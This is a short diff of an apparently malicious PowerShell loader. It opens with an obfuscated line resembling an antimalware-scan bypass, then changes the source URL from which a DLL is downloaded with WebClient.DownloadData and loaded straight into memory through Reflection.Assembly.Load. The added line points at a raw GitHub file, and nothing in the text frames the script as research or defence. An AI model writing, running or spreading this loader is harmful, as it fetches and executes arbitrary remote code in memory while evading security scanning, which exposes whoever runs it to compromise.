@@ -7,7 +7,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 Start-Sleep -Seconds 5
 
 # Download and load the DLL into memory
-$data = (New-Object System.Net.WebClient).DownloadData('https://testeecles.s3.us-west-1.amazonaws.com/system.dll')
+$data = (New-Object System.Net.WebClient).DownloadData('https://raw.githubusercontent.com/ingramali/1111111111111111111/main/windows.dll')
 $assem = [System.Reflection.Assembly]::Load($data)
 
 # List all types in the loaded assembly to inspect what is available
